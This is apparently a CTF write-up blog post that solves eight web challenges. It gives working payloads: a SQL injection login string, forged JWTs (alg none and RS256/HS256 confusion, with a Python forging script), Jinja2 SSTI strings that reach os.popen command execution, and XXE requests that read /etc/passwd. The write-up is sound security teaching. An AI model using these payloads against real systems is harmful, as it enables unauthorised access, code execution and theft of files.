---
layout: post
title:  "Web Challenges"
date:   2026-11-24 01:05:00 -0400
author: uzi
tags: [CTF]
permalink: /cyberzerk-ctf-2026-web/
---
* TOC
{:toc}
{% raw %}
## Ghost Pointer

**Category**: web

**Author**: Perceval

**Description**: Tricatel’s new scoring software “forgets” overtime discreetly. You only have access to your card. However, someone has the right to see the actual hours of the whole team...
`https://pointeuse.cyberzerk.fr`

Looking at the challenge site:

![Alt text](/images/zerkweb1.png)

On the page this cookie is set:
```shell
eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D
```

Url decode then base64 decode to this:
```shell
{"employe":"Vous (#8472)","role":"employe"}
```

I changed the cookie to this:
```shell
{"employe":"Vous (#8472)","role":"admin"}
```

Re-encode the cookie and set it on the page:

![Alt text](/images/zerkweb2.png)

`CyberZerk{P0int3us3_Qu1_0ubl13_L3s_H3ur3s_Sup}`

___

## The SQL or the Thigh?

**Category**: web

**Author**: Perceval

**Description**: The main developer of the startup Tricatel-Cyber has just done a severe burn-out. Under pressure to deliver the new HR portal, he coded the authentication system at 4am after three consecutive sleepless nights, ingesting a toxic blend of caffeine and stress.

The code is sloppy. The mental health of the team is at risk.

Log in as an administrator to retrieve the CEO's confidential internal note and prove that the system is failing. `https://sql.cyberzerk.fr`

Looking at the challenge site:

![Alt text](/images/zerkweb3.png)

Login with: `' OR 1=1-- -:' OR 1=1-- -`

![Alt text](/images/zerkweb4.png)

`CyberZerk{SQL_1nj3ct10n_C4us3d_By_Burn0ut}`

___

## Arrest Disease

**Category**: web

**Author**: Perceval

**Description**: The absence portal is online.

You have access to your own leave application file.

A colleague put a sick leave yesterday following unsustainable pressure from management, his file must be just before yours.

Find a way to read his absence report. `https://absences.cyberzerk.fr`

Looking at the challenge site on `https://absences.cyberzerk.fr/?dossier_id=1042`:

![Alt text](/images/zerkweb5.png)

Looking at `https://absences.cyberzerk.fr/?dossier_id=1041`:

![Alt text](/images/zerkweb6.png)

`CyberZerk{ID0R_M4n4g3m3nt_T0x1qu3}`

___

## Space Manager

**Category**: web

**Author**: Perceval

**Description**: The Tricatel space manager is protected by a JWT token. Your account is only “employed.” An exhausted dev has sloppyed the check of the tokens a night of prod... Forge an admin access and retrieve the BOunty table of the CODIR. `https://manager.cyberzerk.fr`

Looking at the challenge site:

![Alt text](/images/zerkweb7.png)

On the page this jwt is set:
```shell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZW1wbG95ZTg0NzIiLCJyb2xlIjoiZW1wbG95ZSJ9.s9ip1QaEfGwDjSo2VMn4p3fQ1PEGp8GixtSX-jeg6sM

{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user": "employe8472",
  "role": "employe"
}
```

I changed the algorithm to `none`:
```shell
{
  "alg": "none",
  "typ": "JWT"
}
{
  "user": "employe8472",
  "role": "admin"
}
```

Set the admin jwt:

![Alt text](/images/zerkweb8.png)

`CyberZerk{JWT_4lg_N0n3_C_3st_N0n}`

___

## Early Comparison

**Category**: web

**Author**: Perceval

**Description**: The manager portal checks a PIN by comparing its md5... a little fast.? `pin=. Trouvez un code accepté`. `https://comparaison-hative.cyberzerk.fr`

Looking at the challenge site:

![Alt text](/images/zerkweb9.png)

The page had this comment on it:
```html
<!-- TODO Didier: virer la sauvegarde config.php.bak avant la prod, elle traine a la racine. -->
```

Looking at `config.php.bak`:
```shell
curl https://comparaison-hative.cyberzerk.fr/config.php.bak  
<?php  
// Configuration portail manager Tricatel.  
$PIN_HASH = "1a31076f2aeb1e7d69120c9f85c3a8da"; // md5 du PIN admin (6 chiffres)
```

I cracked the hash on crackstation and got the pin `496135`:

![Alt text](/images/zerkweb10.png)

`CyberZerk{un3_sauv3g4rd3_.bak_tr4h1t_l3_pin}`

___

## The HRD Model

**Category**: web

**Author**: Perceval

**Description**: The HRD previews its notifications; the template entered is rendered as is. Get the flag. `https://modele-du-drh.cyberzerk.fr`

Looking at the challenge site:

![Alt text](/images/zerkweb11.png)

Testing `{{ 7*'7' }}` confirms jinja2 SSTI:

![Alt text](/images/zerkweb12.png)

Looking at `{{ config }}`:

![Alt text](/images/zerkweb13.png)

`{% print(lipsum.__globals__['os'].popen('id').read()) %}` confirms RCE:

![Alt text](/images/zerkweb14.png)

I got the flag with `{{lipsum.__globals__['os'].popen('cat flag.txt').read()}}`:

![Alt text](/images/zerkweb15.png)

`CyberZerk{SSTI_j1nj4_rc3_d3puis_un_m0d3l3_d3_c0ng3}`

___

## Export XML

**Category**: web

**Author**: Perceval

**Description**: The import of leave requests accepts XML (POST). Have him read a local file. `https://export-xml.cyberzerk.fr`

Looking at the challenge site:

![Alt text](/images/zerkweb16.png)

I tested for XXE:
```shell
curl -s -X POST https://export-xml.cyberzerk.fr \
  -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE demande [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<demande>
  <agent>Test</agent>
  <motif>&xxe;</motif>
</demande>'
```

Response:
```html
<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"><title>INTRANET - TRICATEL</title><style>body{background-color:#0a0a0a;color:#d4d4d4;font-family:"Courier New",Courier,monospace;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{border:2px solid #333;background-color:#111;width:450px;padding:0}
.wide{width:680px}
.header{background-color:#3CAFD7;color:#000;padding:10px;font-weight:bold;text-transform:uppercase;border-bottom:2px solid #333}
.admin-header{background-color:#28a745;color:#000}
.content{padding:20px}
.dev-note{color:#888;font-size:.85em;margin-bottom:20px;border-left:2px solid #555;padding-left:10px}
label{font-size:.8em;color:#888}
input,textarea{width:100%;background-color:#000;color:#3CAFD7;border:1px solid #444;padding:10px;margin:6px 0 15px;box-sizing:border-box;font-family:inherit}
input:focus,textarea:focus{border-color:#3CAFD7;outline:none}
button{width:100%;background-color:#222;color:#fff;border:1px solid #555;padding:10px;cursor:pointer;font-family:inherit;text-transform:uppercase}
button:hover{background-color:#333;border-color:#3CAFD7}
.error{color:#ff3333;background:#2a0000;border:1px solid #ff3333;padding:10px;margin-bottom:15px;font-size:.9em}
pre{white-space:pre-wrap;word-break:break-all;color:#d4d4d4;margin:0}
.dump-box{background-color:#000;border:1px dashed #C88C37;padding:15px;margin-top:20px}
.dump-title{color:#C88C37;margin-top:0;font-size:1em;text-transform:uppercase}
.flag{color:#fff;background-color:#5a3b00;padding:10px;display:block;box-sizing:border-box;width:100%;margin-top:15px;border:1px solid #C88C37;word-break:break-all}
code{color:#3CAFD7}a{color:#3CAFD7}</style></head><body><div class="container wide"><div class="header">[OK] TRICATEL CYBER - DEMANDE ENREGISTREE</div><div class="content"><p>Demande de congés enregistrée dans le SIRH.</p><div class="dump-box"><p class="dump-title">// Fiche agent</p><pre>Agent : Test
Motif : root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
player:x:10001:10001::/home/player:/bin/sh</pre></div></div></div></body></html>
```
It works!

Get the flag like this:
```shell
curl -s -X POST https://export-xml.cyberzerk.fr \
  -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE demande [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<demande>
  <agent>Test</agent>
  <motif>&xxe;</motif>
</demande>'
```

`CyberZerk{XXE_f1l3_pr0t0c0l_l1t_l3_fich13r_d3s_c0ng3s}`

___

## Delegated Signature

**Category**: web

**Author**: Perceval

**Description**: The tokens are issued in RS256. Endpoints /login /pubkey /admin. Become an administrator. `https://signature-deleguee.cyberzerk.fr`

Looking at the challenge site:

![Alt text](/images/zerkweb17.png)

Response from `GET /pubkey`:
```shell
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain
Date: Mon, 16 Nov 2026 17:44:59 GMT
Referrer-Policy: strict-origin-when-cross-origin
Via: 1.1 Caddy
Via: 1.1 Caddy
X-Content-Type-Options: nosniff
Content-Length: 451

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwKqGf/0fzlGDEkP/0UDz
/3jrJchQ26vDAYCmeMz4zsOFl/YRLidNFyoeRqdnBpvmb836LW8c+z3pHjdylxyX
/eH1LjTYK28Oau/DvAb14BQTlCV4Nbs3b9nkJ3aXujUAzYMmabE4vKDun+FAkY32
2iQWOvERBRLb5y6m6gvDbvf8x8Sl2LJwpO380k7lIzZ0xlpaFiecEFnDsRlbWYb6
S2jvanCMEFQ97Up6y+6vV1ezj5b+bNNCeBvlpZa5yfZP7uSdfDpjlRUClV54zd6o
BnJHzU0k/AWbgLvfNKD26+t21BkBhsr5WK/UR953g8okZ/MsLC6iWZyyRxdm7ftI
xwIDAQAB
-----END PUBLIC KEY-----
```

Response from `GET /login`:
```shell
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: application/json
Date: Mon, 16 Nov 2026 17:45:07 GMT
Referrer-Policy: strict-origin-when-cross-origin
Via: 1.1 Caddy
Via: 1.1 Caddy
X-Content-Type-Options: nosniff
Content-Length: 443

{"token":"eyJhbGciOiAiUlMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VyIjogIm1hcmNfdiIsICJyb2xlIjogInVzZXIifQ.tzR6PYrdpBYm1YBGQK1Ijbz1WWAJdeYveGNcfmAGhGWWND8TECukvv7NedaRCJdf7ref-lULMV4OrtNbcHRwY7XCM3T4QyFeHQbTrD1GgH1TmpdStxCKoaFJz7Co9mhx2SaeENXQhSVw32jJedOFvI4AWbM9av9wiX_nguGSQiF5TEyW1Dl5q3AmfgBT76Cv0tdCVKupC8eJJXd0IUaPI44Vvkemgu6RezY-RRxci72WrB2BQfn-XwDL0xHz0LpKO6r9DHjeA2KdnBW8PucVI4IuGZRkK8gvju7-_EXNkuhe7pYINxYNcPA1hqrHQuUCiaxrCRtyZaMyQwScbhNKQw"}
```

I test algorithm confusion by making the token `HS256` instead of `RS256` with python:
```python
import base64, hmac, hashlib, json  
 
pubkey = """-----BEGIN PUBLIC KEY-----  
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwKqGf/0fzlGDEkP/0UDz  
/3jrJchQ26vDAYCmeMz4zsOFl/YRLidNFyoeRqdnBpvmb836LW8c+z3pHjdylxyX  
/eH1LjTYK28Oau/DvAb14BQTlCV4Nbs3b9nkJ3aXujUAzYMmabE4vKDun+FAkY32  
2iQWOvERBRLb5y6m6gvDbvf8x8Sl2LJwpO380k7lIzZ0xlpaFiecEFnDsRlbWYb6  
S2jvanCMEFQ97Up6y+6vV1ezj5b+bNNCeBvlpZa5yfZP7uSdfDpjlRUClV54zd6o  
BnJHzU0k/AWbgLvfNKD26+t21BkBhsr5WK/UR953g8okZ/MsLC6iWZyyRxdm7ftI  
xwIDAQAB  
-----END PUBLIC KEY-----\n""" # trailing newline is required  
 
def b64url(data: bytes) -> str:  
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()  
 
header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())  
payload = b64url(json.dumps({"user": "marc_v", "role": "admin"}, separators=(",", ":")).encode())  
signing_input = f"{header}.{payload}".encode()  
sig = b64url(hmac.new(pubkey.encode(), signing_input, hashlib.sha256).digest())  
 
print(f"{header}.{payload}.{sig}")  
 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibWFyY192Iiwicm9sZSI6ImFkbWluIn0.IHdQki_51IJb1T4G4i25n_HR3hNocq4L7704yE2nnNQ
```

Testing on `/admin`:
```shell
curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibWFyY192Iiwicm9sZSI6ImFkbWluIn0.IHdQki_51IJb1T4G4i25n_HR3hNocq4L7704yE2nnNQ" https://signature-deleguee.cyberzerk.fr/admin  
Bienvenue administrateur.  
CyberZerk{JWT_c0nfus10n_RS256_v3rs_HS256_cl3_publ1qu3}
```

First take the exact bytes of the public PEM from `/pubkey` (including its trailing newline) as the HMAC secret.

Then forge a new token with `alg: HS256` and `role: admin` signing it with `HMAC-SHA256(pubkey_bytes, header.payload)`.

The server calls something like `jwt.verify(token, pubkey, {no algorithm restriction})`. It sees `alg: HS256` in the forged header and treats the public key string as an HMAC secret. Then it recomputes the signature, it matches because it is signed it with the same bytes.
{% endraw %}
`CyberZerk{JWT_c0nfus10n_RS256_v3rs_HS256_cl3_publ1qu3}`
